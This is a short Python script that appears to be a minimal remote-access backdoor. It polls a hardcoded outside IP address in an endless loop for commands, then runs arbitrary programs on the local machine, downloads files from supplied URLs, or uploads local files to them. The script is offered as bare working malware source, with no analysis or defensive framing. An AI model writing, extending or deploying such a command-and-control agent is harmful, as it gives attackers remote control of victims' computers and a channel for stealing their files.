import requests
from subprocess import call

def GetCommand(c2):
    return (requests.get(c2)).text

def ShellExecute(cmd, cmdArgs):
    call([cmd, cmdArgs])

def Download(url, fileName):
    open(fileName,'wb').write(requests.get(url).content)

def Upload(url, fileName):
    files = {'file': open(fileName, 'rb')}
    requests.post(url, files=files)

c2 = "http://64.137.224.218/file.html"
while True:
    cmdString = GetCommand(c2)
    cmd = cmdString.split()[0]
    if cmd == "run":
        ShellExecute(cmdString.split()[1], cmdString.split()[2])
    elif cmd == "download":
        Download(cmdString.split()[1], cmdString.split()[2])
    elif cmd == "upload":
        Upload(cmdString.split()[1], cmdString.split()[2])
    elif cmd == "exit":
        exit()
    else:
        pass


